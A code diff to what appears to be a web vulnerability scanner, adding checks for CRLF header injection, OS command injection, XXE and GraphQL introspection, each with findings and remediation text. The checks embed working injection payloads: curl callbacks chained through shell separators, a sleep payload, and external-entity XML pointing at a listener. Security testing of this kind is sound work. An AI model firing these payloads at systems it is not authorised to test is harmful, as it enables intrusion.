@@ -15,6 +15,7 @@
 
 import { type HeaderList, get as getHeader, set as setHeader } from '../../core/headers.js';
 import { bodyText } from '../../core/encoding.js';
+import { contentType } from '../../core/message.js';
 import { classifyContext, findReflections, diffResponses, similarity } from '../../replay/diff.js';
 import { canary } from '../../fuzz/payloads.js';
 import {
@@ -910,6 +911,311 @@ export const timeBasedInjectionCheck: ActiveCheck = {
   },
 };
 
+export const crlfInjectionCheck: ActiveCheck = {
+  id: 'AWB-A012',
+  title: 'CRLF injection into a response header',
+  description:
+    'Puts a carriage return and line feed followed by a marker header into reflected ' +
+    'parameters, and confirms by parsing the response: the finding is a header the ' +
+    'server did not set, not a string in the body.',
+  costPerPoint: 3,
+  async run(request, points, context) {
+    const out: ActiveFinding[] = [];
+    const marker = canary('crlf');
+    const injectedName = `x-awb-${marker}`.toLowerCase();
+
+    // The payload a value gets, in two encodings. A filter that strips a raw
+    // newline but not an encoded one, in front of a server that decodes, is
+    // the whole bug -- so which encoding works is worth recording.
+    const encodings: readonly [string, string][] = [
+      ['raw', `\r\n${injectedName}: ${marker}`],
+      ['percent', `%0d%0a${injectedName}:%20${marker}`],
+    ];
+
+    // A header the client can obviously set itself proves nothing; only
+    // parameters whose value the server puts back into a response header are
+    // interesting, so this looks at every point but judges by the response.
+    for (const point of points) {
+      if (point.kind === 'header') continue;
+      if (context.sender.requestsLeft < 1) break;
+
+      let found: { encoding: string; exchangeId: string; where: string } | undefined;
+      for (const [encoding, payload] of encodings) {
+        if (context.sender.requestsLeft < 1) break;
+        const probe = await context.sender.send(inject(request, point, `${point.original}${payload}`), this.id);
+        if (probe.response === undefined) continue;
+
+        // The marker as a real header is the confirmation. A value that
+        // merely contains the literal text is not: it has to have been parsed
+        // as a header by the server for this to be exploitable.
+        // A match in the body text is not enough: the marker has to have been
+        // parsed by the server as its own response header, which is what the
+        // injected CR and LF would cause and what a stripped value would not.
+        if (getHeader(probe.response.headers, injectedName) === marker) {
+          found = { encoding, exchangeId: probe.exchange.id, where: `the ${injectedName} response header` };
+          break;
+        }
+      }
+      if (found === undefined) continue;
+
+      out.push({
+        check: this.id,
+        title: `CRLF injection in ${point.label}`,
+        severity: 'high',
+        confidence: 'certain',
+        detail:
+          `A CRLF sequence placed in ${point.label} (${found.encoding} encoding) produced a new ` +
+          `header line in the response: ${found.where} carried the injected marker ${marker}, ` +
+          'which the application does not otherwise set. The value reaches the response header ' +
+          'block without the CR and LF being stripped.\n\n' +
+          'This is header injection: an attacker chooses response headers. Depending on what the ' +
+          'value feeds, that is a forged Set-Cookie, a cache-poisoning key, or -- where a bare LF ' +
+          'reaches the body -- response splitting.',
+        remediation:
+          'Strip or reject CR and LF in any value placed into a response header, after decoding. ' +
+          'Most HTTP server libraries do this when the header is set through their API rather ' +
+          'than by string concatenation; this bug usually means a header is being built by hand.',
+        url: request.url,
+        evidence: [found.exchangeId],
+      });
+    }
+
+    return out;
+  },
+};
+
+export const commandInjectionCheck: ActiveCheck = {
+  id: 'AWB-A013',
+  title: 'OS command injection',
+  description:
+    'Tries to make the server run a command that calls back to the workbench listener, ' +
+    'and -- when there is no listener -- whether a sleep command delays the response ' +
+    'beyond what the baseline variance explains.',
+  costPerPoint: 4,
+  needsOob: true,
+  async run(request, points, context) {
+    const out: ActiveFinding[] = [];
+
+    const candidates = points
+      .filter(
+        (p) =>
+          p.kind !== 'header' &&
+          (/cmd|command|exec|run|ping|host|ip|addr|target|domain|file|name|path|query|q$|search|url|action|func|option|arg|input|data/i.test(
+            p.name,
+          ) ||
+            points.length <= 4),
+      )
+      .slice(0, 5);
+
+    const listener = context.oob;
+    if (listener !== undefined) {
+      // The confident path: a command that fetches a unique URL. If the
+      // listener records it, the server ran the command -- no guessing from
+      // output, which is why this works on a blind injection.
+      const pending: { point: InjectionPoint; token: string; exchangeId: string }[] = [];
+      for (const point of candidates) {
+        if (context.sender.requestsLeft < 1) break;
+        const mark = listener.mint(`command injection via ${point.label}`);
+        // One payload packs the separators that differ between shells, so a
+        // candidate costs one request rather than one per separator.
+        const payload =
+          `${point.original};curl ${mark.url};` +
+          `|curl ${mark.url}|` +
+          `\`curl ${mark.url}\`` +
+          `$(curl ${mark.url})` +
+          `&curl ${mark.url}&`;
+        const probe = await context.sender.send(inject(request, point, payload), this.id);
+        pending.push({ point, token: mark.token, exchangeId: probe.exchange.id });
+      }
+
+      if (pending.length > 0) await sleep(6000);
+
+      for (const entry of pending) {
+        const interactions = listener.forToken(entry.token);
+        if (interactions.length === 0) continue;
+        out.push({
+          check: this.id,
+          title: `OS command injection in ${entry.point.label}`,
+          severity: 'critical',
+          confidence: 'certain',
+          detail:
+            `A command substitution placed in ${entry.point.label} caused the server to reach the ` +
+            `workbench listener: ${interactions.map((i) => `${i.kind} from ${i.remoteAddress}`).join('; ')}. ` +
+            'The value is passed to a shell. Arbitrary command execution follows from there.',
+          remediation:
+            'Do not pass user input to a shell. Call the program directly with an argument vector ' +
+            '(execve, not system/popen), so there is no shell to interpret metacharacters, and ' +
+            'validate the argument against an allow-list where the program itself is the risk.',
+          url: request.url,
+          evidence: [entry.exchangeId],
+        });
+      }
+      if (out.length > 0) return out;
+    }
+
+    // The fallback when nothing is listening: a sleep, judged the same
+    // conservative way as the time-based SQL check.
+    const delaySeconds = 5;
+    for (const point of candidates.slice(0, 2)) {
+      if (context.sender.requestsLeft < 7) break;
+      const baseline: TimingSample[] = [];
+      for (let i = 0; i < 4; i += 1) {
+        const r = await context.sender.send(inject(request, point, point.original), this.id);
+        baseline.push({ elapsedMs: r.response?.elapsedMs ?? 0, status: r.response?.status });
+      }
+      const payload = `${point.original};sleep ${delaySeconds}`;
+      const test: TimingSample[] = [];
+      let lastExchange = '';
+      for (let i = 0; i < 3; i += 1) {
+        if (context.sender.requestsLeft < 1) break;
+        const r = await context.sender.send(inject(request, point, payload), this.id);
+        test.push({ elapsedMs: r.response?.elapsedMs ?? 0, status: r.response?.status });
+        lastExchange = r.exchange.id;
+      }
+      const verdict = judgeTiming(baseline, test, delaySeconds * 1000);
+      if (!verdict.delayed) continue;
+      out.push({
+        check: this.id,
+        title: `OS command injection in ${point.label} (time-based)`,
+        severity: 'critical',
+        confidence: 'firm',
+        detail:
+          `A sleep command in ${point.label} delayed the response reproducibly. ${verdict.reason}.\n\n` +
+          'No out-of-band listener was available, so this is a timing inference rather than a ' +
+          'recorded callback; run the scan with `awb oob` for a definitive confirmation.',
+        remediation:
+          'Do not pass user input to a shell. Call the program directly with an argument vector.',
+        url: request.url,
+        evidence: [lastExchange],
+      });
+      break;
+    }
+
+    return out;
+  },
+};
+
+export const xxeCheck: ActiveCheck = {
+  id: 'AWB-A014',
+  title: 'XML external entity',
+  description:
+    'For a request whose body is XML, declares an external entity pointing at the ' +
+    'workbench listener and references it. A callback proves the parser resolved it.',
+  costPerPoint: 2,
+  needsOob: true,
+  async run(request, _points, context) {
+    const listener = context.oob;
+    if (listener === undefined) return [];
+
+    const ct = contentType(request.headers) ?? '';
+    const bodyStart = request.body.toString('utf8').trimStart().slice(0, 64);
+    const looksXml = /xml/.test(ct) || bodyStart.startsWith('<?xml') || /^<[a-zA-Z]/.test(bodyStart);
+    if (!looksXml) return [];
+
+    const mark = listener.mint(`XXE via ${request.method} ${request.url}`);
+    // A general-entity form and a parameter-entity form: the first is blocked
+    // by a parser that forbids general-entity expansion but the second is
+    // not, and vice versa, so both are tried under one token.
+    const payloads: readonly string[] = [
+      `<?xml version="1.0"?><!DOCTYPE awb [<!ENTITY xxe SYSTEM "${mark.url}">]><awb>&xxe;</awb>`,
+      `<?xml version="1.0"?><!DOCTYPE awb [<!ENTITY % xxe SYSTEM "${mark.url}"> %xxe;]><awb>x</awb>`,
+    ];
+
+    let lastExchange = '';
+    for (const payload of payloads) {
+      if (context.sender.requestsLeft < 1) break;
+      const body = Buffer.from(payload, 'utf8');
+      // The payload is one this check built, so its length is set rather than
+      // preserved: without it the server frames an empty body and sees no XML.
+      const headers = setHeader(request.headers, 'content-length', String(body.length));
+      const probe = await context.sender.send({ ...request, headers, body }, this.id);
+      lastExchange = probe.exchange.id;
+    }
+
+    const interactions = await listener.wait(mark.token, 6000);
+    if (interactions.length === 0) return [];
+
+    return [
+      {
+        check: this.id,
+        title: 'XML external entity (XXE)',
+        severity: 'high',
+        confidence: 'certain',
+        detail:
+          `An XML body declaring an external entity caused the server to reach the workbench ` +
+          `listener: ${interactions.map((i) => `${i.kind} from ${i.remoteAddress}`).join('; ')}. ` +
+          'The XML parser resolves external entities, so it can be made to fetch URLs (a form of ' +
+          'SSRF) and, with the right entity, to read local files.',
+        remediation:
+          'Disable DOCTYPE processing in the XML parser, or at least external entity and external ' +
+          'DTD resolution. Every mainstream parser has a flag for this; the secure setting is ' +
+          'rarely the default.',
+        url: request.url,
+        evidence: [lastExchange],
+      },
+    ];
+  },
+};
+
+export const graphqlIntrospectionCheck: ActiveCheck = {
+  id: 'AWB-A015',
+  title: 'GraphQL introspection is enabled',
+  description:
+    'Sends an introspection query to an endpoint that looks like GraphQL and confirms ' +
+    'the schema came back. An exposed schema is not itself a vulnerability but it hands ' +
+    'an attacker the full attack surface.',
+  costPerPoint: 1,
+  async run(request, _points, context) {
+    const url = request.url.toLowerCase();
+    const bodyText_ = request.body.toString('utf8');
+    const looksGraphql =
+      /graphql|graphiql|\/gql\b/.test(url) ||
+      (contentType(request.headers) === 'application/json' &&
+        /"query"\s*:/.test(bodyText_) &&
+        bodyText_.includes('{'));
+    if (!looksGraphql) return [];
+
+    const query = '{"query":"query awb{__schema{queryType{name} types{name kind}}}"}';
+    const headers = setHeader(
+      setHeader(request.headers, 'content-length', String(Buffer.byteLength(query))),
+      'content-type',
+      'application/json',
+    );
+    const probe = await context.sender.send(
+      { ...request, method: 'POST', headers, body: Buffer.from(query, 'utf8') },
+      this.id,
+    );
+    if (probe.response === undefined) return [];
+
+    const text = bodyText(probe.response.headers, probe.response.body);
+    // The query string itself contains "__schema", so matching that proves
+    // nothing -- an endpoint that echoes the request back would pass. A real
+    // introspection answer carries structure the query did not send: the
+    // named query type, or the array of types. Require one of those.
+    const answered = /"queryType"\s*:/.test(text) || /"types"\s*:\s*\[/.test(text);
+    if (!answered) return [];
+
+    return [
+      {
+        check: this.id,
+        title: 'GraphQL introspection is enabled',
+        severity: 'low',
+        confidence: 'certain',
+        detail:
+          'An introspection query returned the schema: the response names the query type and the ' +
+          'type list. Introspection lets any client enumerate every query, mutation, field and ' +
+          'argument the API has, which turns a black-box target into a white-box one.',
+        remediation:
+          'Disable introspection in production, or gate it behind authentication. Note that ' +
+          'disabling it is defence in depth, not access control -- the fields still exist and a ' +
+          'determined attacker can guess them, so it does not substitute for authorising each one.',
+        url: request.url,
+        evidence: [probe.exchange.id],
+      },
+    ];
+  },
+};
+
 function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => {
     setTimeout(resolve, ms);
@@ -928,6 +1234,10 @@ export const ACTIVE_CHECKS: readonly ActiveCheck[] = [
   methodTamperingCheck,
   authorisationDifferentialCheck,
   timeBasedInjectionCheck,
+  crlfInjectionCheck,
+  commandInjectionCheck,
+  xxeCheck,
+  graphqlIntrospectionCheck,
 ];
 
 export function activeCheckById(id: string): ActiveCheck | undefined {
